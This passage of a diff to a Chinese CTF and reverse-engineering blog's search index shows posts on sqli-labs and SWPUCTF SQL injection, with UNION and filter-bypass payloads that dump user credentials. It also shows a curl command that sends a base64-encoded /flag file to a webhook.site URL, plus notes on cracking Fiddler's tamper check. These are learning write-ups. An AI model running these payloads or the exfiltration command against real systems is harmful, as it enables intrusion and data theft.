class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./redhot.jpg&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;&#x27;</span>; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这都不能bypass？不准你玩cod&quot;</span>); &#125;<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;喜欢用轮椅枪是吧，账号给你ban了！&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./ban.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;&#x27;</span>; <br>&#125; <br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>按钮事件</title>
+    <link href="/2024/10/18/%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6/"/>
+    <url>/2024/10/18/%E6%8C%89%E9%92%AE%E4%BA%8B%E4%BB%B6/</url>
+    
+    <content type="html"><![CDATA[<p>在我们进行逆向时普遍会遇到出现弹窗，但是我们没有办法搜索到字符串完成定位点的问题，这个时候我们可以利用按钮时间来到达对应的输入断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181444105.png" srcset="/img/loading.gif" lazyload><br>在我们这图中，在输入完数之后我们不点登录在od中查找二进制字符串，如下<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181449498.png" srcset="/img/loading.gif" lazyload><br>之后我们会到达此处，此处的断点便是易语言的按钮事件断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181450283.png" srcset="/img/loading.gif" lazyload></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Hook</title>
+    <link href="/2024/10/16/Hook/"/>
+    <url>/2024/10/16/Hook/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Hook是一种技术，它允许一个程序监视和修改另一个程序的运行。Hook技术通常用于调试、修改程序行为、保护程序等目的。</p><p>在Windows操作系统中，Hook技术主要分为以下几种：键盘Hook、鼠标Hook、消息Hook、API Hook等。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SetWindowsHookExA函数是Windows API中用于设置Hook的函数。它可以用于监视和修改其他程序的键盘、鼠标、消息等事件。</p><p>SetWindowsHookExA函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK <span class="hljs-title function_">SetWindowsHookExA</span><span class="hljs-params">(</span><br><span class="hljs-params">  <span class="hljs-type">int</span>       idHook,</span><br><span class="hljs-params">  HOOKPROC  lpfn,</span><br><span class="hljs-params">  HINSTANCE hmod,</span><br><span class="hljs-params">  DWORD     dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><h3 id="键盘消息钩取练习"><a href="#键盘消息钩取练习" class="headerlink" title="键盘消息钩取练习"></a>键盘消息钩取练习</h3>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>DLL</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>wuai第八课</title>
+    <link href="/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/"/>
+    <url>/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/</url>
+    
+    <content type="html"><![CDATA[<h1 id="bss节区"><a href="#bss节区" class="headerlink" title=".bss节区"></a>.bss节区</h1><h2 id="bss节区简介"><a href="#bss节区简介" class="headerlink" title=".bss节区简介"></a>.bss节区简介</h2><p>bss节区是程序中未初始化的全局变量和静态变量所在的节区，它通常在程序开始执行前被初始化为0。bss节区的大小由程序中未初始化的全局变量和静态变量的数量和大小决定。</p><h2 id="bss节区的特点"><a href="#bss节区的特点" class="headerlink" title=".bss节区的特点"></a>.bss节区的特点</h2><p>可以用于反dump</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>课程</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>sqli练习</title>
+    <link href="/2024/10/06/sqli%E7%BB%83%E4%B9%A0/"/>
+    <url>/2024/10/06/sqli%E7%BB%83%E4%B9%A0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="sqli开头简介"><a href="#sqli开头简介" class="headerlink" title="sqli开头简介"></a>sqli开头简介</h1><p>sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！</p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>联合查询特点：<br>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项  </p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li><li>构造联合查询?id&#x3D;-1’ union select 1,2,3–+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li></ol><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol><li>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li></ol><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><h2 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>输入?id&#x3D;1’，页面报错，说明存在单引号注入</li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>sql</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>sql</title>
+    <link href="/2024/10/01/sql/"/>
+    <url>/2024/10/01/sql/</url>
+    
+    <content type="html"><![CDATA[<p>后面预计会把这些相同的文章全部集合起来，知识点主要都是做题得来得多做点题，省得什么都不会，难搞，也只有半年就要去考研了，唉ctfer起步太慢</p><h3 id="三个表"><a href="#三个表" class="headerlink" title="三个表"></a>三个表</h3><ul><li>information_schema.schemata: 该数据表存储了 mysql 数据库中的所有数据库的库名</li><li>information_schema.tables： 该数据表存储了 mysql 数据库中的所有数据表的表名</li><li>information_schema.columns: 该数据表存储了 mysql 数据库中的所有列的列名</li></ul><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>先讲讲什么加堆叠注入,堆叠注入就是一条sql语句后面加;，多条语句一起执行，比如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br>,其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity</span><br><span class="hljs-comment">//mysql connections for stacked query examples.</span><br><span class="hljs-variable">$con1</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con1</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    @<span class="hljs-title function_ invoke__">mysqli_select_db</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$dbname</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> ( <span class="hljs-string">&quot;Unable to connect to the database: <span class="hljs-subst">$dbname</span>&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br>&#123;<br>    <br>    <br>    <span class="hljs-comment">/* store first result set */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Username is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Password is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>        &#125;<br><span class="hljs-comment">//            mysqli_free_result($result);</span><br>    &#125;<br>        <span class="hljs-comment">/* print divider */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_more_results</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>            <span class="hljs-comment">//printf(&quot;-----------------\n&quot;);</span><br>    &#125;<br>     <span class="hljs-comment">//while (mysqli_next_result($con1));</span><br>&#125;<br><span class="hljs-keyword">else</span> <br>    &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>    &#125;<br><span class="hljs-comment">/* close connection */</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con1</span>);<br><br></code></pre></td></tr></table></figure><p>对输入的参数没有进行严格的过滤，攻击者构造恶意的攻击语句造成了SQL注入攻击，存在回显点，可以进行联合注入，并且如果出现错误，会输出报错信息，这里也可以使用显错注入。<br>还可以看到，这里的SQL语句查询使用的是mysqli_multi_query函数，mysqli_multi_query函数可以执行多条SQL语句。</p><p>别人得wp直接拿过来，下次给我启发<br>[SWPUCTF 2021 新生赛]sql</p><ol><li><p>测试</p><blockquote><p>?wllm&#x3D;1 – 正常<br>?wllm&#x3D;1’ – 报错<br>?wllm&#x3D;1’%23 –%23&gt;#– 正常<br>?wllm&#x3D;1’or 1&#x3D;1%23 – 发现有过滤  </p></blockquote></li><li><p>测试过滤</p><blockquote><p>空格，等号<br>空格&#x3D;&gt;&#x2F;xx&#x2F;<br>等号&#x3D;?like</p></blockquote></li><li><p>测试注入</p></li></ol><ul><li>测试长度  <blockquote><p>?wlmm&#x3D;1’order&#x2F;**&#x2F;by&#x2F;**&#x2F;3%23 – 正常<br>?wlmm&#x3D;1’order&#x2F;**&#x2F;by&#x2F;**&#x2F;4%23 – 错误<br>– 测试长度为3</p></blockquote></li><li>测试回显  <blockquote><p>?wlmm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23 # 2,3回显位置</p></blockquote></li><li>查库  <blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,database()%23 # test_db</p></blockquote></li><li>查表  <blockquote><p>wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;‘test_db’%23 – LTLT_flag,users</p></blockquote></li><li>查列  <blockquote><p>wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;‘test_db’%23<br>– id,flag,id,username</p></blockquote></li><li>查内容<blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(flag)&#x2F;**&#x2F;from&#x2F;**&#x2F;test_db.LTLT_<br>flag%23<br>– NSSCTF{e99758c1-d31b</p></blockquote></li><li>位数长度不足<br>使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid</li><li>mid截取，因为回显只能有20个，所以20，一组截取<blockquote><p>?wllm&#x3D;-1’union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,mid(group_concat(flag),20,20)&#x2F;**&#x2F;from&#x2F;**&#x2F;tes<br>t_db.LTLT_flag%23</p></blockquote></li><li>需要读三组<br>NSSCTF{e99758c1-d31b-4497-8d44-abfe84caa0ed}</li></ul><p>写一个可能有问题得点,-1为什么有显示，1没有显示<br>布尔逻辑：<br>在某些情况下，数据库会对输入进行布尔评估。比如，如果原始查询是：</p><blockquote><p>SELECT * FROM users WHERE active &#x3D; 1;  </p></blockquote><p>如果数据库中没有任何记录的 active 字段为 1，那么这个查询不会返回任何结果。但如果用 -1 替代，可能会导致返回符合条件的结果。<br>错误处理和信息泄露：</p><p>数据库在处理 1 和 -1 时的错误处理方式可能不同。例如，如果 1 导致一个错误或异常，而 -1 不会，这可能会导致不同的行为。在某些系统中，-1 可能被用作特定的标志，表示某种状态或条件。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>sql</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>php函数初识</title>
+    <link href="/2024/09/30/php%E5%88%9D%E8%AF%86/"/>
+    <url>/2024/09/30/php%E5%88%9D%E8%AF%86/</url>
+    
+    <content type="html"><![CDATA[<p>本文讲对php的部分可能引起漏洞的部分函数进行讲解</p><span id="more"></span><h1 id="php函数初识"><a href="#php函数初识" class="headerlink" title="php函数初识"></a>php函数初识</h1><h2 id="1-phpinfo"><a href="#1-phpinfo" class="headerlink" title="1. phpinfo()"></a>1. phpinfo()</h2><p>phpinfo() 函数会显示 PHP 配置信息以及当前的 PHP 环境信息，包括服务器信息、操作系统信息、PHP 版本、已安装的扩展、环境变量等。这个函数通常用于调试和开发过程中查看 PHP 配置信息。</p><h2 id="2-eval"><a href="#2-eval" class="headerlink" title="2. eval()"></a>2. eval()</h2><p>eval() 函数会将传入的字符串作为 PHP 代码进行执行。如果传入的字符串包含恶意代码，eval() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt;x = <span class="hljs-number">7</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>( <span class="hljs-string">&#x27;3 * x&#x27;</span> )<br><span class="hljs-number">21</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;pow(2,2)&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;2 + 2&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; n=<span class="hljs-number">81</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;n + 4&quot;</span>)<br><span class="hljs-number">85</span><br></code></pre></td></tr></table></figure><h2 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3. preg_replace()"></a>3. preg_replace()</h2><p>preg_replace() 函数用于执行正则表达式替换操作。如果正则表达式不正确或者传入的替换字符串包含恶意代码，preg_replace() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><h2 id="4-include-和-require"><a href="#4-include-和-require" class="headerlink" title="4. include() 和 require()"></a>4. include() 和 require()</h2><ul><li>incluce 在用到时加载<br>include 的文件中出错了，主程序继续往下执行</li><li>require 在一开始就加载<br>require 的文件出错了，主程序也停了</li><li>_once 后缀表示已加载的不加载</li></ul><h2 id="5-file-get-contents"><a href="#5-file-get-contents" class="headerlink" title="5. file_get_contents()"></a>5. file_get_contents()</h2><p>file_get_contents() 函数用于读取文件内容。如果传入的文件路径包含恶意代码，file_get_contents() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><h2 id="6-system"><a href="#6-system" class="headerlink" title="6. system()"></a>6. system()</h2><p>system() 函数用于执行系统命令。如果传入的命令包含恶意代码，system() 函数将会执行这些恶意代码，从而可能导致命令注入漏洞。</p><h2 id="7-exec"><a href="#7-exec" class="headerlink" title="7. exec()"></a>7. exec()</h2>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>php</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>区块链</title>
     <link href="/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
     <url>/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
@@ -104,31 +454,6 @@
   
   
   <entry>
-    <title>web2</title>
-    <link href="/2024/09/24/web2/"/>
-    <url>/2024/09/24/web2/</url>
-    
-    <content type="html"><![CDATA[<h3 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h3><h4 id="重定向到文件"><a href="#重定向到文件" class="headerlink" title="重定向到文件"></a>重定向到文件</h4><blockquote><p>cmd_here &gt; 1.txt<br>然后利用wegt命令进行文件下载</p></blockquote><h4 id="curl外带"><a href="#curl外带" class="headerlink" title="curl外带"></a>curl外带</h4><p>可以利用webhook.site建立网络端口监听，<br>然后执行<br>cmd&#x3D;curl <a href="https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/%60cat">https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/`cat</a> &#x2F;flag | base64&#96;<br>来实现base64编码获取</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4>]]></content>
-    
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>web</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>od命令</title>
     <link href="/2024/09/20/od%E5%91%BD%E4%BB%A4/"/>
     <url>/2024/09/20/od%E5%91%BD%E4%BB%A4/</url>
@@ -136,31 +461,6 @@
     <content type="html"><![CDATA[]]></content>
     
     
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>针对Fiddler4.6.2的反编译以及最新版本的破解</title>
-    <link href="/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/"/>
-    <url>/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/</url>
-    
-    <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1837902&highlight=fiddler+4.6.2">参考文献吾爱破解</a></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我们根据作者的了解发现fiddler对软件有篡改检验，所以我们有以下的几个思路</p><blockquote><ol><li>修改本地文件使篡改检测失效</li><li>本地建议服务器伪造响应</li></ol></blockquote><h3 id="常用IL对应十六进制"><a href="#常用IL对应十六进制" class="headerlink" title="常用IL对应十六进制"></a>常用IL对应十六进制</h3>]]></content>
-    
-    
-    <categories>
-      
-      <category>逆向实战</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>revser</tag>
-      
-    </tags>
     
   </entry>
   
@@ -217,81 +517,6 @@
   
   
   <entry>
-    <title>扫描基础和方式</title>
-    <link href="/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/"/>
-    <url>/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/</url>
-    
-    <content type="html"><![CDATA[<h3 id="前提概要"><a href="#前提概要" class="headerlink" title="前提概要"></a>前提概要</h3><p>在学习Nmap时我认为只要了解操作就行了不过，在思考之后我认为我们还是应该学习基本的原理和知识</p><h3 id="扫描基础"><a href="#扫描基础" class="headerlink" title="扫描基础"></a>扫描基础</h3><h4 id="3-5-1-TCP-三次握手"><a href="#3-5-1-TCP-三次握手" class="headerlink" title="3.5.1 TCP 三次握手"></a>3.5.1 TCP 三次握手</h4><p>第一步 - 客户端发起连接请求：</p><ul><li>客户端发送SYN（同步）包： 客户端向服务器发送一个TCP包，其中SYN标志位被设置为1，同时选择一个初始的序列号（Seq&#x3D;X）。<blockquote><p>源端口：随机端口号<br>目标端口：服务器的TCP端口号<br>SEQ：客户端选择的初始序列号<br>ACK：0<br>Flags：SYN&#x3D;1, ACK&#x3D;0, 其他标志位&#x3D;0<br>窗口大小：（根据需要设置</p></blockquote></li></ul><p>第二步 - 服务器回应连接请求：</p><ul><li>服务器发送SYN-ACK包： 服务器收到客户端的SYN包后，如果愿意建立连接，就向客户端发送一个响应，其中SYN和ACK标志位都被设置为1，同时服务器也选择一个初始的序列号（Seq&#x3D;Y），并确认客户端的序列号（Ack&#x3D;X+1）。<blockquote><p>源端口：服务器的TCP端口号<br>目标端口：客户端的随机端口号<br>SEQ：服务器选择的初始序列号<br>ACK：客户端的初始序列号+1<br>Flags：SYN&#x3D;1, ACK&#x3D;1, 其他标志位&#x3D;0<br>窗口大小：（根据需要设置）</p></blockquote></li></ul><p>第三步 - 客户端确认连接：</p><ul><li>客户端发送ACK包： 客户端收到服务器的SYN-ACK包后，向服务器发送确认包，其中ACK标志位设置为1，确认服务器的序列号（Ack&#x3D;Y+1）。<blockquote><p>源端口：随机端口号<br>目标端口：服务器的TCP端口号<br>SEQ：客户端的初始序列号+1<br>ACK：服务器的初始序列号+1<br>Flags：ACK&#x3D;1, 其他标志位&#x3D;0<br>窗口大小：（根据需要设置）</p></blockquote></li></ul><h3 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a>扫描方式</h3><h4 id="1-TCP-SYN-扫描"><a href="#1-TCP-SYN-扫描" class="headerlink" title="1 TCP SYN 扫描"></a>1 TCP SYN 扫描</h4><blockquote><p>nmap -sS ip</p></blockquote><p>TCP SYN 扫描是一种用于探测目标主机上开放端口的网络扫描技术。它属于 Nmap 